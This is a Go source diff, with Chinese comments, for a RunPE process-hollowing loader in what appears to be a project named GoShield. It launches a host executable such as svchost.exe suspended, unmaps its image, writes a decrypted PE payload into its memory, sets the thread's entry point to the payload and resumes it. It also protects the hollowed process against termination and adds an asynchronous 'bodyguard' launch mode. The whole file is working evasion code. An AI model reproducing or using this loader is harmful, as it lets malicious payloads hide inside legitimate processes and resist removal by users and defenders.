@@ -6,7 +6,7 @@ import (
 	"syscall"
 	"unsafe"
 
-	"github.com/Limkon/GoShield/internal/protect" // 🌟 修复：必须引入 protect 包
+	"github.com/Limkon/GoShield/internal/protect"
 )
 
 const (
@@ -16,19 +16,29 @@ const (
 	MEM_RESERVE            = 0x2000
 )
 
-// Execute 在内存中直接运行 PE 字节码 (RunPE)
-// targetPath: 作为宿主外壳运行的合法程序路径 (例如 "C:\\Windows\\System32\\svchost.exe" 或自身可执行文件路径)
-// payload: 解密后的原始 EXE 字节流
-func Execute(targetPath string, payload []byte) error {
-	// 1. 解析 Payload 的 PE 头
+var procGetExitCodeProcess = kernel32.NewProc("GetExitCodeProcess")
+
+// Execute 阻塞运行 PE 字节码，并返回进程退出码 (供幽灵保镖监控使用)
+func Execute(targetPath string, payload []byte) (uint32, error) {
+	return executeInternal(targetPath, payload, true)
+}
+
+// ExecuteAsync 异步运行 PE 字节码，不阻塞 (供父进程献祭前秒启动保镖使用)
+func ExecuteAsync(targetPath string, payload []byte) error {
+	_, err := executeInternal(targetPath, payload, false)
+	return err
+}
+
+// 核心内部加载引擎
+func executeInternal(targetPath string, payload []byte, wait bool) (uint32, error) {
 	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payload[0]))
-	if dosHeader.E_magic != 0x5A4D { // "MZ"
-		return fmt.Errorf("invalid DOS magic")
+	if dosHeader.E_magic != 0x5A4D {
+		return 0, fmt.Errorf("invalid DOS magic")
 	}
 
 	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[dosHeader.E_lfanew]))
-	if ntHeader.Signature != 0x00004550 { // "PE\0\0"
-		return fmt.Errorf("invalid NT signature")
+	if ntHeader.Signature != 0x00004550 {
+		return 0, fmt.Errorf("invalid NT signature")
 	}
 
 	targetPtr, _ := syscall.UTF16PtrFromString(targetPath)
@@ -37,7 +47,6 @@ func Execute(targetPath string, payload []byte) error {
 	var pi PROCESS_INFORMATION
 	si.Cb = uint32(unsafe.Sizeof(si))
 
-	// 2. 以挂起状态 (CREATE_SUSPENDED) 创建傀儡进程
 	ret, _, err := procCreateProcessW.Call(
 		uintptr(unsafe.Pointer(targetPtr)),
 		0, 0, 0, 0,
@@ -47,24 +56,22 @@ func Execute(targetPath string, payload []byte) error {
 		uintptr(unsafe.Pointer(&pi)),
 	)
 	if ret == 0 {
-		return fmt.Errorf("CreateProcess failed: %v", err)
+		return 0, fmt.Errorf("CreateProcess failed: %v", err)
 	}
 
-	// 🌟🌟🌟 核心遗漏修复：必须为刚刚创建出来的傀儡进程（无论是业务程序还是 svchost 影子）强行注入防杀护甲！
+	// 🌟 为生成的傀儡进程立刻套上 DACL 防杀护甲！
 	protect.ProtectProcessByHandle(pi.Process)
 
-	// 3. 获取进程的 PEB (进程环境块)
 	var pbi PROCESS_BASIC_INFORMATION
 	var returnLength uint32
 	procNtQueryInformationProcess.Call(
 		uintptr(pi.Process),
-		0, // ProcessBasicInformation
+		0,
 		uintptr(unsafe.Pointer(&pbi)),
 		uintptr(unsafe.Sizeof(pbi)),
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
-	// 4. 读取宿主进程原本的 ImageBase (在 PEB + 16 字节处，针对 64 位)
 	var hostImageBase uint64
 	var bytesRead uintptr
 	procReadProcessMemory.Call(
@@ -75,13 +82,11 @@ func Execute(targetPath string, payload []byte) error {
 		uintptr(unsafe.Pointer(&bytesRead)),
 	)
 
-	// 5. 如果 Payload 的基址与宿主冲突，卸载宿主进程内存
 	payloadImageBase := ntHeader.OptionalHeader.ImageBase
 	if hostImageBase == payloadImageBase {
 		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(hostImageBase))
 	}
 
-	// 6. 在傀儡进程中为 Payload 申请内存空间 (PAGE_EXECUTE_READWRITE)
 	allocAddress, _, _ := procVirtualAllocEx.Call(
 		uintptr(pi.Process),
 		uintptr(payloadImageBase),
@@ -90,10 +95,9 @@ func Execute(targetPath string, payload []byte) error {
 		uintptr(PAGE_EXECUTE_READWRITE),
 	)
 	if allocAddress == 0 {
-		return fmt.Errorf("VirtualAllocEx failed")
+		return 0, fmt.Errorf("VirtualAllocEx failed")
 	}
 
-	// 7. 写入 PE 头
 	var bytesWritten uintptr
 	procWriteProcessMemory.Call(
 		uintptr(pi.Process),
@@ -103,7 +107,6 @@ func Execute(targetPath string, payload []byte) error {
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
 
-	// 8. 逐一写入各个 Section (如 .text, .data, .rsrc)
 	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + uint32(unsafe.Sizeof(*ntHeader))
 	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
 		sectionPtr := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
@@ -119,7 +122,6 @@ func Execute(targetPath string, payload []byte) error {
 		}
 	}
 
-	// 9. 获取傀儡线程上下文
 	var ctx CONTEXT64
 	ctx.ContextFlags = CONTEXT_FULL
 	alignCtx := (*CONTEXT64)(unsafe.Pointer((uintptr(unsafe.Pointer(&ctx)) + 15) &^ 15))
@@ -127,7 +129,6 @@ func Execute(targetPath string, payload []byte) error {
 
 	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 
-	// 10. 将 Payload 的真正基址写入 PEB，并将 RCX 寄存器修改为真正的入口点 (EntryPoint)
 	var newImageBase = uint64(allocAddress)
 	procWriteProcessMemory.Call(
 		uintptr(pi.Process),
@@ -139,12 +140,16 @@ func Execute(targetPath string, payload []byte) error {
 	
 	alignCtx.Rcx = uint64(allocAddress) + uint64(ntHeader.OptionalHeader.AddressOfEntryPoint)
 
-	// 11. 应用新的上下文，并恢复线程执行
 	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 	procResumeThread.Call(uintptr(pi.Thread))
 
-	// 12. 阻塞等待：等待傀儡进程（真实程序）运行结束。0xFFFFFFFF 代表 INFINITE（无限等待）
-	procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
+	// 如果需要等待，则死守并获取退出码
+	if wait {
+		procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
+		var exitCode uint32
+		procGetExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode)))
+		return exitCode, nil
+	}
 
-	return nil
+	return 0, nil
 }
